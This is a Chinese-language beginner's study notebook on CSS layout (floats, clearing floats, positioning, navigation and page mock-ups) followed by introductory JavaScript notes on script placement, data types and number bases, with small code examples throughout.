![](https://box.kancloud.cn/b57b209ceecb9d6c2a3f87a2524b3d8d_220x324.png)

* * * * *
<br>

>[success] # 什么是浮动-float

> 非官方讲解理解，就是一群鸟在天上飞，有一只飞高了，但水平方向不变，后面的鸟飞到他的下面从上网下看的效果

>[danger] ##### 浮动的案例

```
<head>
	<title></title>
</head>
	<style type="text/css">
	.red,.green,.blue{
		width: 200px;
		height: 200px;
	}
	.red{
		background-color: red;
        float:left;
	}
	.green{
		background-color: green;
	}
	.blue{
		background-color: blue;
				


	}
	</style>	
<body>
	<div class="red"></div>
	<div class="green"></div>
	<div class="blue"></div>
</html>
```

**没有浮动前：**
![](https://box.kancloud.cn/5e588e6800095d8b43ec44370a58b003_446x620.png)

**使用浮动红色：**
![](https://box.kancloud.cn/a33c642689d5e600fffa69825badb441_513x455.png)

**使用浮动绿色：**
![](https://box.kancloud.cn/4fe0489632550a011ac81d2458058750_491x440.png)

**使用浮动蓝色：**
![](https://box.kancloud.cn/9c20cba802e3020008715eb25cc12858_511x622.png)


>[danger] ##### 浮动特点-float

```
float:  left   |   right
```

**特点：**
★元素浮动之后不占据原来的位置（脱文档流）
★浮动的盒子在一行上显示
**效果**
![](https://box.kancloud.cn/0975425ae1490af4856cbadd611bc8a8_779x257.png)
**代码**
![](https://box.kancloud.cn/3deac1dc0b49f193d1bb6a02d2a96d79_287x234.png)
★行内元素浮动之后转换为行内块元素。（不推荐使用，转行内元素最好使用display: inline-block;）

>
>[success] # 文本绕图

>早期的浮动是为了 ，解决文字环绕，所以文字上级浮动，文字不会跑的他的下面，只会在他的旁边

**代码：**
```
<head>
	<title></title>
</head>
	<style type="text/css">
		.box{
			height: 500px;
			width: 500px;
			background:#eee;
		}

		.box img{
			float: left;
		}
	</style>	
<body>
	<div class="box">
		<img src="0.jpg" >
		<p>文字 浮动<p>
		<p>文字 浮动<p>
	</div>
	
</html>
```

![](https://box.kancloud.cn/f33e824bba40856b1cc2079c1ef25ed1_498x265.png)



[TOC=1,5]
>[success] # 制作导航

* * * * *
<br>


>[danger] #####  案例展示

![](https://box.kancloud.cn/75e40ffdffd5ad91f51f043454995db3_848x62.png)

<br>

* * * * *
>[danger] ##### 案例分析

>1.使用ul布局
>2.使用li 浮动
>3.使用padding 内边距 增加块的宽度，是文本产生居中

* * * * *
<br>

>[danger] 代码分析

![](https://box.kancloud.cn/04d38583774b3c1b9bb137b559a34560_637x484.png)

![](https://box.kancloud.cn/41412987ddf0894f0a5b20d9d9d90562_327x138.png)


>[danger] ##### 代码

```
<head>
	<title></title>
</head>
	<style type="text/css">
		body,ul,li{
			margin: 0;
			padding: 0;
		}
		ul,li{
			list-style: none;
		}

		.nav{
			width: 800px;
			height: 40px;
			background-color: pink;
			margin: 20 auto;
		}
		.nav ul li{
			float: left;
		}
		.nav ul li a{
			display: inline-block;
			height: 40px;
			line-height: 40px;
			padding: 0 10px;
			text-decoration: none;
		}
		a:hover{
			background-color: #eee;
		}

	</style>	
<body>
	<div class="nav">
		<ul>
			<li><a href="">标题一</a></li>
			<li><a href="">标题二</a></li>
			<li><a href="">标题三</a></li>
		</ul>

	</div>
	
</html>
```
>[success] # 导航案例

* * * * *

>[danger] ##### 效果

>![](https://box.kancloud.cn/ab394d7eb39a89e0eb837dc4686fbe80_1361x83.png)


* * * * *
<br>

>[danger] ##### 效果分析

>1.首先一个大的div
>2.标题套着小div 用来让文字居中
>3.li 浮动

>[danger] ##### 注意点

去除ul li 的 内外边距，li样式
![](https://box.kancloud.cn/ecbe8e6199cef540eff7ce1ed78368e9_270x140.png)
保证同一个标签的权重
![](https://box.kancloud.cn/9f2b55ff6add9af07ec074339eb94510_364x162.png)

* * * * *
<br>

>[danger] ##### 代码分析
![](https://box.kancloud.cn/e10f769f3ac7a53172ab75e77178d0f2_480x284.png)

>[danger] ##### 代码

```
<head>
	<title></title>
</head>
	<style type="text/css">
	body,li,ul{
		margin: 0;
		padding: 0;
	}
	li{
		list-style: none;
	}
	.nav{
		height: 55px;
		background:#eee;
		margin-top: 30px;
		border-top:1px solid #666; 
	}
	.nav-con{
		width: 1000px;
		margin: 0 auto;
		height: 55px
	}
	.nav-con ul li{
		float: left;
		height: 55px;
		padding: 0 20px;

	}

	ul li a{
		display: inline-block;
		height: 55px;
		font: 18px/55px 微软雅黑;
	}
	ul li a:hover{
		color: green;
	}
	</style>	
<body>
	<div class="nav">
		<div class="nav-con">
			<ul>
				<li><a href="">标题一</a></li>
				<li><a href="">标题二</a></li>
				<li><a href="">标题三</a></li>
			</ul>
		</div>
	</div>
	
</html>
```
>[success] # 效果展示图
![](https://box.kancloud.cn/692ce4e394e5bf5d771bf05a93ceb6e3_273x372.png)

>[danger] ##### 分析
```
1.整体布局分头
2.内容div包含左右两个div
3.脚div
```

>[danger] ##### css分析
![](https://box.kancloud.cn/0e923fd60ee3105285bcd2ece81a0dd6_555x224.png)


* * * * *
![](https://box.kancloud.cn/5f159cde58ecf5d88903e9253c077c7d_479x248.png)

**注意：**
1.为什么不设置 脚的位置，因为div自上而下，main没有浮动，所以脚自动在下面
2.中间的两个浮动距离，左侧左浮动，右侧有浮动，想要中间的距离左右内容块任意一个减10

>[danger] ##### 代码

```
<head>
	<title></title>
</head>
	<style type="text/css">
		.header,.main,.footer{
			width: 500px;
		}
		.header,.footer{
			height: 100px;
			background:#000;
		}
		.main{
			height: 500px;
			margin:10px 0;
		}
		.main .content{
			width: 300px;
			height: 500px;
			
			background:#eee;
			float: left;
		}
		.main .sidebarr{
			width: 190px;
			height: 500px;
			background:red;
			float: right;
		}
		
	</style>	
<body>
	<div class="header"></div>
		<div class="main">
			<div class="content"></div>
			<div class="sidebarr"></div>

		</div>
	
	<div class="footer"></div>
</html>
```
>[success] # 布局展示

![](https://box.kancloud.cn/04c3452dc5ccd49ed53c68bd0bfe8087_514x466.png)

* * * * *

>[danger] ##### 代码分析
 ![](https://box.kancloud.cn/ae3b5d41fb6276d55868d43a975880a6_648x444.png)
 
 
 <br>
 
* * * * *
![](https://box.kancloud.cn/6c12db53d0f63ac97c3cef8027996a69_760x291.png)

>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<style>
    .header,.main,.footer{
        width:500px;
    }
    .header,.footer{
        height: 100px;
        background: pink;
    }

    .main{
        height: 300px;
        background: #3736ae;
    }
    .left,.right{
        width: 100px;
        height: 300px;
        background: orange;
    }
    .left{
        float:left;
    }
    .right{
        float: right;
    }
    .content{
        width: 300px;
        height: 300px;
        float: left;
    }
    .content .content-top{
        height: 150px;
        background: #db4c3f;

    }
    .content .content-bot{
        height: 150px;
        background: #db4c3f;

    }
</style>

<body>

    <div class="header"></div>
    <div class="main">
        <div class="left"></div>
        <div class="content">
            <div class="content-top"></div>
            <div class="content-bot"></div>
        </div>
        <div class="right"></div>
    </div>
    <div class="footer"></div>
</body>
</html>
```
[TOC=1,5]

>[success] # 清除浮动

当父盒子没有定义高度，嵌套的盒子浮动之后，下边的元素发生位置错误。

>[danger] ##### 代码

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .header,.main,.footer{
            width: 500px;
        }
        .header,.footer{
            background: black;
            height: 100px;
        }
        .main{

            height: 400px;
            margin: 10px 0px;
        }
        .content{
            background: pink;
            width: 300px;
            height:400px;
            float: left;
        }
        .sidebar{
            width:190px;
            height: 400px;
            background: yellow;
            float: right;
        }


    </style>
</head>
<body>
   <div class="header"></div>
    <div class="main">
        <div class="content"></div>
        <div class="sidebar"></div>
    </div>
    <div class="footer"></div>
</body>
</html>
```

>[danger] ##### 如图

**定义父类盒子的时候：**
![](https://box.kancloud.cn/b14b8070fbd30971fed41fee0a00d482_764x689.png)

**没有的最外层的盒子的时候**

![](https://box.kancloud.cn/792338373ca4d4c1a741c409834f37ed_597x550.png)


>[success] # 解决

>[danger] ##### 额外标签法-clear

`clear: left  |  right  | both`

在浮动 和非浮动的块级标签下面加一个 div 样式是用clear
![](https://box.kancloud.cn/e14e7527557e4a098c55e7569f865e28_464x219.png)


* * * * *
>[danger] ##### 给父集元素使用overflow:hidden

这种方法的局限性，就是当，浮动的溢出了，溢出的的内容就不会显示，只会显示在父类没有溢出的浮动

![](https://box.kancloud.cn/5c3d3884bab9123d8a18e9c153c4c26c_438x401.png)

>[danger] ##### 伪元素清除浮动  推荐使用 用在父元素

这个跟第一种一样的，不同的是配置了个全局class 变量，代码的意思是创建了一个块级元素然后用了clear 清除浮动
```
.clearfix:after{
            content: '.';
            display: block;
            height: 0;
            line-height: 0;
            /*能见度*/
            visibility: hidden;
            clear: both;
        }
        /*兼容ie浏览器*/
        .clearfix{
            zoom: 1;
        }
```

![](https://box.kancloud.cn/78ecc1c9d3026eb91f49c525a12c6639_645x489.png)

[TOC=1,5]
>[danger] ##### 腾讯
```
body,ol,ul,h1,h2,h3,h4,h5,h6,p,th,td,dl,dd,form,fieldset,legend,input,textarea,select{margin:0;padding:0} 
body{font:12px"宋体","Arial Narrow",HELVETICA;background:#fff;-webkit-text-size-adjust:100%;} 
a{color:#2d374b;text-decoration:none} 
a:hover{color:#cd0200;text-decoration:underline} 
em{font-style:normal} 
li{list-style:none} 
img{border:0;vertical-align:middle} 
table{border-collapse:collapse;border-spacing:0} 
p{word-wrap:break-word}
```

>[danger]#####  新浪 

```
body,ul,ol,li,p,h1,h2,h3,h4,h5,h6,form,fieldset,table,td,img,div{margin:0;padding:0;border:0;} 
body{background:#fff;color:#333;font-size:12px; margin-top:5px;font-family:"SimSun","宋体","Arial Narrow";}
ul,ol{list-style-type:none;} 
select,input,img,select{vertical-align:middle;} 
a{text-decoration:none;} 
a:link{color:#009;} 
a:visited{color:#800080;} 
a:hover,a:active,a:focus{color:#c00;text-decoration:underline;} 

```

>[danger]#####  淘宝

```
body, h1, h2, h3, h4, h5, h6, hr, p, blockquote, dl, dt, dd, ul, ol, li, pre, form, fieldset, legend, button, input, textarea, th, td { margin:0; padding:0; } 
body, button, input, select, textarea { font:12px/1.5tahoma, arial, \5b8b\4f53; } 
h1, h2, h3, h4, h5, h6{ font-size:100%; } 
address, cite, dfn, em, var { font-style:normal; } 
code, kbd, pre, samp { font-family:couriernew, courier, monospace; } 
small{ font-size:12px; } 
ul, ol { list-style:none; } 
a { text-decoration:none; } 
a:hover { text-decoration:underline; } 
sup { vertical-align:text-top; } 
sub{ vertical-align:text-bottom; } 
legend { color:#000; } 
fieldset, img { border:0; }
button, input, select, textarea { font-size:100%; } 
table { border-collapse:collapse; border-spacing:0; } 

```
![](https://box.kancloud.cn/c60ed359f6a9e1528ef85833ee4836a9_648x239.png)

简单的说 visible 不会有影响，hidden 会把超出d盒子的内容删掉，盒子有多少显示多少，scroll 和 auto 都是会出现滚动条，前者是一直都有，后者是内容多的时候才显示滚动条
[TOC=1,5]

>[danger] ##### static 静态定位

>静态定位吗默认值稳定流，简单说没用，就是一个div盒子位置不能改变


* * * * *
>[danger] ##### absolute; 绝对定位

```
★元素使用绝对定位之后不占据原来的位置（脱标）
★元素使用绝对定位，位置是从浏览器出发。
★嵌套的盒子，父盒子没有使用定位，子盒子绝对定位，子盒子位置是从浏览器出发。
★嵌套的盒子，父盒子使用定位，子盒子绝对定位，子盒子位置是从父元素位置出发。
★给行内元素使用绝对定位之后，转换为行内块。（不推荐使用，推荐使用display:inline-block;）

```
* * * * *
>[danger] ##### relative 相对定位
```
★使用相对定位，位置从自身出发。
★还占据原来的位置。
★子绝父相（父元素相对定位，子元素绝对定位）
★行内元素使用相对定位不能转行内块
◆固定定位

```

>[danger] ##### Position:fixed;

★固定定位之后，不占据原来的位置（脱标）
★元素使用固定定位之后，位置从浏览器出发。注意只从浏览器出发
★元素使用固定定位之后，会转化为行内块（不推荐，推荐使用display:inline-block;）

>[danger] ##### 总结
```
1.position的值为absolute、fixed的元素脱离文档流，static、relative没有脱离文档流
```
[TOC]
>[success] #  规避脱标流

```
◆尽量使用标准流。
◆标准流解决不了的使用浮动。
◆浮动解决不了的使用定位。
```

![](https://box.kancloud.cn/83d05ddc52ce7021e139e5fce1974c4f_396x228.png)



>[danger] ##### left 和margin-right

![](https://box.kancloud.cn/c1259ddd81bf309a25bf3c6b98ccb97e_466x266.png)

* * * * *


**只有设置了position 才可以使用left和right**



* * * * *

</br>

>[danger] ##### margin-left/right auto


* * * * *
**效果**
![](https://box.kancloud.cn/34eca5436bdaa59581fe6151e0756970_344x213.png)


**代码**
![](https://box.kancloud.cn/0ef2d5d1a3baa4f3e4862ac285470067_510x285.png)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        .bg{
            height: 200px;
            width: 300px;
            background: black;
        }
        .con{

            width: 20px;
            height: 20px;
            background: red;
            margin-left: auto;
        }

    </style>
</head>
<body>
<div class="bg">
    <div class="con"></div>
</div>
</body>
</html>
```
[TOC=1,5]
>[success] # 效果

![](https://box.kancloud.cn/6cdc67b3acf4d172a3a86b19943a0c9b_1206x58.png)

>[danger] ##### 分析
```
1.最外层大盒子
2.最内层小盒子
3.小盒子的li 浮动
4.设置a的内边距
5.根据子绝父相定位图片
```

>[danger] ##### 关键位置分析
![](https://box.kancloud.cn/9f039ddc29f36e4286f398fa9ec078c5_453x212.png)

>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        li,ul{
            margin: 0;
            padding: 0;
        }
        li{
            list-style: none;
            float: left;
        }
        a{
            display: inline-block;
            padding: 0 10px 0 10px;
            height:40px ;
            font: 20px/40px 微软雅黑;
        }
        a:hover{
            background: blue;
        }

        .nav{
            height: 40px;
            background: orange;
        }
        .nav-title{
            width: 1000px;
            margin: 0 auto;
            position: relative;
        }
        .news{
            position: absolute;
            left: 30px;
            bottom:-15px
        }
    </style>
</head>
<body>
    <div class="nav">
        <div class="nav-title">

            <ul>
                <li><a >智能手机</a></li>
                <li><a>平板电脑</a></li>
                <li><a>超级笔记</a></li>
            </ul>
            <div class="news">
                <img src="new.png">
            </div>
        </div>
    </div>
</body>
</html>
```
[TOC]
>[success]  # 目前的理解

```
1.浮动是相对自己的
2.定位相对于参照物，可以更快，指定位置
```
当我们想让这个title在没有浮动的背景上时，调整浮动div的外边距，形成重叠
![](https://box.kancloud.cn/3e21b3bd62542c6daa9361ce1aad946b_857x502.png)

如果直接使用子绝父相定位，可以快速根据父类的div 定位，调整对应的 方位


>[danger] ##### 代码

![](https://box.kancloud.cn/d67b46b03d514366a1246911e3142c5d_629x526.png)

>[danger] ##### 整体代码

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
    <style>
        .bg {
            width: 1226px;
            margin: 0 auto;
            position: relative;
        }
        .xiaom_left{
            position: absolute;
            top: 0px;
            left: 0px;
        }
        .left{
            position: absolute;
            top: 212px;
            left: 250px;
        }
        .right{
            float: right;
            margin-right: 20px;
        }
    </style>
<body>
<div class="bg">
    <img src="1.jpg">
    <div class="xiaom_left"><img src="xiaom_left.png"></div>
    <div class="left"><img src="left.png"></div>
    <div class="right"><img src="right.png"></div>

</div>
</body>
</html>
```
[TOC]
>[success] # 绝对定位案例

![](https://box.kancloud.cn/99d2ca09f57022bd374d34f73c327d7c_1352x399.png)

>[danger] ##### 代码

![](https://box.kancloud.cn/d7e3f70b928c21cc7e53a28490912dd9_598x472.png)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<style>
    .box{
        width: 998px;
        margin: 0 auto;
        margin-top: 53px;
    }
    .nav{
        position: fixed;
        left: 0px;
        top: 0px;
    }
    .left{
        position: fixed;
        top:60px;
        left: 0px;
    }
</style>
<body>
    <div class="bg">
        <div class="nav"><img src="r1_c1.png"></div>
        <div class="box"><img src="box.png"></div>
        <div class="left"><img src="r2_c1.png"></div>
        <div><img src="r2_c2.png"></div>
    </div>
</body>
</html>
```
[TOC]
>[success] # 案例

```
★:margin:0 auto;  只能让标准流的盒子居中对齐。
★定位的盒子居中：先左右走父元素盒子的一半50%，
  在向左走子盒子的一半(margin-left:负值。)
```
![](https://box.kancloud.cn/37a1c384f71d8335a0156a14768f8750_1355x559.png)

>[danger] ##### 思路
```
1.先left 百分之五十移动，找到中轴
2.在调整 要居中的盒子 margin-left，这margin-left只是相当于坐标
```
![](https://box.kancloud.cn/d25676d0e4ab1c256ab562cb920acc96_516x361.png)

>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<style>
    .box{
        height: 500px;
        background: black;
        position: relative;
    }
    .nav{
        width: 960px;
        height: 60px;
        background: blue;
        position: absolute;
        bottom: 0px;
        left: 50%;
        margin-left:-480px;
    }
</style>
<body>
<div class="box">
    <div class="nav">
    </div>
</div>
</body>
</html>
```
>[success] # 居中对齐

默认是基线对齐，所以要设置

![](https://box.kancloud.cn/ceccbdca00dc74c79fd0c756e63ec634_511x226.png)


>[danger] ##### 其他属性

![](https://box.kancloud.cn/b0abbd67341b70ae0e67fce8773d4b1b_536x255.png)
>[success] # 点击logo跳转

![](https://box.kancloud.cn/ed329059aaf4564684a53bb459a43987_415x367.png)

>[danger] ##### 代码

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>

</head>
<style>
    .logo{
        width: 143px;
        height: 76px;
        background: url("4.png");
    }
    a{
        display: inline-block;
        text-indent: -5000em;
    }
</style>
<body>
<div class="logo">

    <a href="https://www.baidu.com">百度</a>

</div>
</body>
</html>
```
>[success] # css可见性

```
overflow:hidden;   溢出隐藏    
visibility:hidden;   隐藏元素    隐藏之后还占据原来的位置。
display:none;      隐藏元素    隐藏之后不占据原来的位置。
Display:block;     元素可见
Display:none  和display:block  常配合js使用。

```

>[success] # 滑动门
“滑动门”设计的非常巧妙，采用两个相同的背景图像，一左一右，一个负责提供左边框，一个负责提供右边框。如下图所示，较深颜色区域表示二者重叠的部分，当需要容纳较多文字时，重叠就少一些，而需要较少文字时，重叠就多一些。两个图像可以滑动，重叠的部分的宽度会根据里面的文字的字数而自动调整，就像两扇推拉门一样，因此这种技术就叫做“滑动门”。

![](https://box.kancloud.cn/1106ba14961e1090a9648bd49739d1aa_149x116.png)

>[danger] ##### 制作 滑动门

滑动门不局限背景和文字


![](https://box.kancloud.cn/c70a9ee89963289e5cc85a5a4560546b_640x247.png)
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <style type="text/css">
        .nav{
            height: 100px;
        }
        .left,.cen,.right{
            float: left;
        }
        .cen{
            height: 100px;
            background: url("m.png");
            line-height: 100px;
        }


    </style>
</head>
<body>
<div class="nav">
    <div class="left"><img src="l.png" alt=""></div>
    <div class="cen">测试</div>
    <div class="right"><img src="r.png" alt=""></div>

</div>
</body>
</html>
```
[手机官网案例](手机官网案例.md)

[头部分析](头部分析.md)
[内容分析](内容分析.md)
[新闻分析](新闻分析.md)

>[success] # 案例分析

>[danger] ##### 样式分析

**标题logo分析：**

![](https://box.kancloud.cn/a21eb1eb555e9822c1cae3574ecd0bb4_1437x189.png)

![](https://box.kancloud.cn/cdda6e910736c0cce458393dfe8c6cf8_841x501.png)

**nav菜单分析：**
![](https://box.kancloud.cn/d0115039ed82df1c4fb786accdba9bbc_1129x147.png)

>[danger] ##### 注意点

**input**
可以去除input的 所以样式。用div包裹input 和按钮，要做好input 在div 中的浮动

>[danger] ##### 代码

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<style>
    body,li,ul,input{
        margin: 0;
        padding: 0;
    }
    input{
        border:0 none;
        outline-style: none;  /*清除轮廓线*/
    }

    img{
        border:0 none;
    }

    li{
        list-style: none;
    }
    a{
        text-decoration: none;
    }
    .header{
        height: 39px;
        width: 984px;
        margin: 20px auto 0;
    }
    .logo {
        height: 39px;
        float: left;
    }
    .search{
        width: 195px;
        height: 30px;
        border: 1px solid #ECECEC;
        float: right;
    }
    .search input[type="text"]{
        width: 165px;
        height: 30px;
        float: right;
    }
    .search input[type="button"]{
        width: 30px;
        height: 30px;
        float: right;
        background: url("search2.jpg");
    }
    .nav{
        height: 55px;
        border-top:1px solid #E1E1E1;
        background: url("nav_bg.png");
    }

    .nav-con{
        width:980px;
        height: 55px;
        margin:0 auto;

    }
    .nav-con li{
        float: left;
    }

    .nav-con li a{
        display: inline-block;
        height: 55px;
        margin: 0 46px;
        font:700 12px/55px 宋体 ;
        color: black;
    }
    .nav-con li a:hover{
        color: blue;
    }
</style>
<body>
    <div class="header">
        <div class="logo">
            <img src="logo.jpg">
        </div>
        <div class="search">
            <input type="text" class="txt">
            <input type="button" class="bnt">
        </div>
    </div>
    <div class="nav">
        <div class="nav-con">
            <ul>
                <li><a href="#">首页</a></li>
                <li><a href="#">智能手机</a></li>
                <li><a href="#">平板电脑</a></li>
                <li><a href="#">配件</a></li>
                <li><a href="#">服务支持</a></li>
                <li><a href="#">关于尚合</a></li>
            </ul>
        </div>
    </div>

</body>
</html>
```
>[success] # 内容分析

设置div 和图片的div 大小一样，margin：0 auto 居中，文字提示的div设置，设置文字，和浮动右侧分享链接
![](https://box.kancloud.cn/5c28705af79738c161c3786054ede37a_1433x642.png)

>[danger] ##### 代码分析

![](https://box.kancloud.cn/25385da8856551cae4555b6537ef48e0_879x520.png)


* * * * *

![](https://box.kancloud.cn/e2212b9b2485765dc8824013b139d746_731x246.png)
>[success] # 新闻分析

分析一个大的div套着，三个小div，每个div里面 又包含两个div

![](https://box.kancloud.cn/7b97812e08dfc49178bc66884f686012_1021x265.png)


>[danger] ##### 注意点图片文字居中对齐

在img中加这个属性

![](https://box.kancloud.cn/a45b9c42e83acbb3e14a76c927349a0e_316x77.png)


* * * * *

>[danger] ##### 代码

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<style>
    body,li,ul,input{
        margin: 0;
        padding: 0;
    }
    input{
        border:0 none;
        outline-style: none;  /*清除轮廓线*/
    }

    img{
        border:0 none;
    }

    li{
        list-style: none;
    }
    a{
        text-decoration: none;
    }
    .header{
        height: 39px;
        width: 984px;
        margin: 20px auto 0;
    }
    .logo {
        height: 39px;
        float: left;
    }
    .search{
        width: 195px;
        height: 30px;
        border: 1px solid #ECECEC;
        float: right;
    }
    .search input[type="text"]{
        width: 165px;
        height: 30px;
        float: right;
    }
    .search input[type="button"]{
        width: 30px;
        height: 30px;
        float: right;
        background: url("search2.jpg");
    }
    .nav{
        height: 55px;
        border-top:1px solid #E1E1E1;
        background: url("nav_bg.png");
    }

    .nav-con{
        width:980px;
        height: 55px;
        margin:0 auto;

    }
    .nav-con li{
        float: left;
    }

    .nav-con li a{
        display: inline-block;
        height: 55px;
        margin: 0 46px;
        font:700 12px/55px 宋体 ;
        color: black;
    }
    .nav-con li a:hover{
        color: blue;
    }
    .banner{
        height: 597px;
        width: 980px;
        margin: 0 auto;
    }
    .gg{
        height: 34px;
        border-top:1px solid #EFEFEF;
        border-bottom:1px solid #EFEFEF;
        margin-bottom: 12px;
        background: #FBFBFB;

    }

    .gg .gg-mid{
        width:980px;
        margin:0 auto;
    }
    .gg .gg-mid span{
        display: inline-block;
        line-height: 34px;
    }
    .r-gg{
        float: right;
        margin-top: 8px;
    }
    .news{
        width: 981px;
        height: 225px;
        margin: 0 auto;
    }
    .left{
        float: left;
    }
    .news-cen,.news-left,.news-right{
        height: 224px;
        border: 1px solid lavender;
    }
    .news-left{
        width: 310px;
        position: relative;
    }
    .news-left img{
        vertical-align: middle;
    }
    .pro{
        margin-top: 5px;
        margin-left: 5px;

    }
    .pic{
        position: absolute;
        left: 50px;
        top: 30px;
    }
    .news-cen{
        width: 373px;
        margin-left: 12px;
        margin-right: 12px;
    }
    .news-cen img{
        vertical-align: middle;
    }

    .news-right{
        width: 268px;
    }
    .news-cen ul{

        margin: 10px 7px 0px;
    }
    .news-cen ul li{
        font-size: 12px;
        height: 27px;
        line-height: 27px;
        border-bottom:1px black dashed ;
    }

</style>
<body>
    <div class="header">
        <div class="logo">
            <img src="logo.jpg">
        </div>
        <div class="search">
            <input type="text" class="txt">
            <input type="button" class="bnt">
        </div>
    </div>
    <div class="nav">
        <div class="nav-con">
            <ul>
                <li><a href="#">首页</a></li>
                <li><a href="#">智能手机</a></li>
                <li><a href="#">平板电脑</a></li>
                <li><a href="#">配件</a></li>
                <li><a href="#">服务支持</a></li>
                <li><a href="#">关于尚合</a></li>
            </ul>
        </div>
    </div>
    <div class="banner">
        <img src="banner.jpg">
    </div>
    <div class="gg">
        <div class="gg-mid">
            <span>入网许可恭喜恭喜</span>
            <div class="r-gg">
                <img src="zone.png" alt="">
            </div>

        </div>
    </div>

    <div class="news">
        <div class="news-left left">
            <div class="pro">
                <img src="o.jpg">
                新品发布
            </div>
            <div class="pic">
                <img src="home_hot_01.png">
            </div>
        </div>
        <div class="news-cen left">
            <div class="pro">
                <img src="o.jpg">
                产品介绍
            </div>
            <ul class="newslist-list">
                <li class="ftcolor">致歉公告</li>
                <li>首批尚合Aonet已全部售馨!</li>
                <li>【媒体报导】国产高性价比 尚合Aonet四核手机评测</li>
                <li>我司产品已经通过了国家强制性产品3C认证</li>
                <li>尚合Aone智能手机入网证已经获工信部门审批下发.</li>
                <li>我司通过ISO9001:2008国际质量管理体系认证</li>
            </ul>

        </div>
        <div class="news-right left"></div>
    </div>
</body>
</html>
```
>[success] # js 常识
```
1.书《编写可维护的javascript》
```
>[danger] ##### js 书写的位置

```
js的代码可以分三个地方写:
1.在html的文件中,script的标签中写js代码
2.js代码可以在html的标签中写---
3.在js文件中可以写js代码,但是需要在html的页面中引入 script的标签中的src="js的路径"
```

>[danger] ##### js 注意问题
```
1.在一对script的标签中有错误的js代码,那么该错误的代码后面的js代码不会执行
2.如果第一对的script标签中有错误,不会影响后面的script标签中的js代码执行
3.script的标签中可以写什么内容 type="text/javascript"是标准写法或者写language="JavaScript"都可以但是,目前在我们的html页面中,type和language都可以省略,原因:html是遵循h5的标准
4.有可能会出现这种情况:script标签中可能同时出现type和language的写法.
5.script标签在页面中可以出现多对
6.script标签一般是放在body的标签的最后的,有的时候会在head标签中,
7.如果script标签是引入外部js文件的作用,那么这对标签中不要写任何的js代码,如果要写,重新写一对script标签,里面写代码
```
[注释](注释.md)
[类型](类型.md)
[变量](变量.md)
[流程控制](流程控制.md)
[操作运算符](操作运算符.md)
[数组](数组.md)
[函数](函数.md)
[对象](对象.md)

>[success] # 注释

```
// 单行注释：一般用在一行代码的上面

/****/多行注释 ：一般是用在函数或者是一段代码的上面
```
>[success] # js  中类型

```
js中的原始数据类型:number,string,boolean,null,undefined,object
```

>[success] # 各个类型所对的含义

```
1.number:数字类型(整数和小数)

2.string:字符串类型(的值一般都是用单引号或者是双引号括起来)  "34"

3.boolean:布尔类型(值只有两个,true(真1),false(假0))

4.null:空类型,值只有一个:null,一个对象指向为空了,此时可以赋值为null

5.undefined:未定义,值只有一个:undefined  例如 var num;
	什么情况下的结果是undefined
    变量声明了,没有赋值,结果是undefined
    函数没有明确返回值,如果接收了,结果也是undefined

6.如果一个变量的结果是undefined和一个数字进行计算,结果:NaN不是一个数字,也没有意义

object:对象---->
```

>[danger] ##### 注解第六条

>![](https://box.kancloud.cn/e6e1ab75c5d698e887bdbcb8e682e4a5_186x49.png)
>


* * * * *
<br>

>[success] # 获取变量类型-typeof 

>[danger] ##### 用法

typeof 变量名
typeof(变量名)


* * * * *


>[danger] ##### 案例

```
var num = 10;
var str = "小白";
var flag = true;
var nll = null;
var undef;
var obj = new Object();
//是使用typeof 获取变量的类型
console.log(typeof num);//number
console.log(typeof str);//string
console.log(typeof flag);//boolean
console.log(String(nll));//是null
console.log(typeof nll);//不是null object
console.log(typeof undef);//undefined
console.log(typeof obj);//object
console.log(typeof(num));		
```
[TOC=1,5]
>[success] # 数字类型-number

>num=20;      整数
>num=98.76;小数

>[danger] ##### 分类

```
1.二进制:遇到2进一
2.八进制:遇到8进一
3.十进制:遇到10进一
4.十六进制:遇到f进一
```

>[danger] ##### 二进制
```
00000001-----1
00000010-----2
00000011-----3
00000100-----4
```

* * * * *

>[danger] ##### 八进制

```
00000006
00000007
00000010-----8
00000011-----9
00000012-----10
```

>[danger] ##### 十六制
```
 	* 00000001
    * 00000002
    * 00000003
    * 00000004
    * 00000005
    * 00000006
    * 00000007
    * 00000008
    * 00000009
    * 0000000a----10
    * 0000000b---11
    * 0000000c----12
    * 0000000d---13
    * 0000000e---14
    * 0000000f---15
    * 00000010---16
    * 00000011---17
    * 00000012---18
```

>[danger] ##### js 代表进制

```
var num=10;//十进制
var num2=012;//八进制
var num3=0x123;//十六进制
```

>[danger] ##### number类型最大最小范围 MAX_VALUE/MIN_VALUE

![](https://box.kancloud.cn/1dccba1d8ecf23c7399b6419c16e2e02_253x122.png)


>[danger] ##### 注意不要用小数求证小数

![](https://box.kancloud.cn/1de530b26d71fbb77e7a951c0b1c11e3_194x70.png)

```
 var x=0.1;
 var y=0.2;
 var sum=x+y;
 console.log(sum==0.3);   结果flase
```


* * * * *

>[danger] ##### 判断当前不是数字为真-isNaN


不是数字为true ，是数字为flase
![](https://box.kancloud.cn/d026f4ceb882c321fd153fc7bb1a2ca8_338x156.png)
 
 
 >[success] # 总结
 
```
    * 数字类型:number类型
    * 无论是整数还是小数都是数字类型
    * 不要用小数验证小数
    * 不要使用NaN判断是不是NaN，应该使用isNaN(值或者是变量)
    * 想要表示十进制:就是正常的数字
    * 想要表示八进制:以0开头
    * 想要表示十六进制:0x开头

```
>[success] # 字符串类型

